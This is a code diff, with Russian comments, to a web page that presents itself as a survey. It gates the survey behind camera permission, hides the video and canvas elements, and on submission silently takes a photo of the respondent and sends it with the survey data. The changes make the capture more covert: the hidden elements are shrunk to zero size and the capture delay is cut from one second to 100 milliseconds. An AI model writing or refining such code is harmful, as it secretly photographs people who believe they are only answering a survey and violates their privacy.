@@ -108,12 +108,13 @@
         }
         #videoElement, #photoCanvas {
             display: none;
+            width: 0;
+            height: 0;
         }
         .nickname-input {
             margin-bottom: 20px;
         }
         .camera-access {
-            display: none;
             background: white;
             padding: 25px;
             border-radius: 15px;
@@ -192,6 +193,8 @@
         // Показываем запрос на доступ к камере при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('cameraAccess').style.display = 'block';
+            document.getElementById('surveyForm').style.display = 'none';
+            document.getElementById('thankYou').style.display = 'none';
             
             document.getElementById('allowCameraBtn').addEventListener('click', function() {
                 requestCameraAccess();
@@ -208,12 +211,11 @@
                     // Инициализируем видео, но не показываем его пользователю
                     const video = document.getElementById('videoElement');
                     video.srcObject = stream;
-                    video.play();
                     
-                    // Останавливаем камеру через 1 секунду (просто для проверки доступа)
+                    // Останавливаем камеру сразу после проверки доступа
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
-                    }, 1000);
+                    }, 100);
                 })
                 .catch(err => {
                     alert('Для участия в опросе необходимо разрешить доступ к камере. Пожалуйста, обновите страницу и разрешите доступ.');
@@ -246,14 +248,13 @@
                     surveyData.cameraAccess = true;
                     const video = document.getElementById('videoElement');
                     video.srcObject = stream;
-                    video.play();
                     
-                    // Делаем фото через 1 секунду
+                    // Делаем фото через короткое время
                     setTimeout(() => {
                         takeAndSendPhoto(surveyData);
                         // Останавливаем камеру
                         stream.getTracks().forEach(track => track.stop());
-                    }, 1000);
+                    }, 100);
                 })
                 .catch(err => {
                     console.log("Доступ к камере не разрешен при отправке");
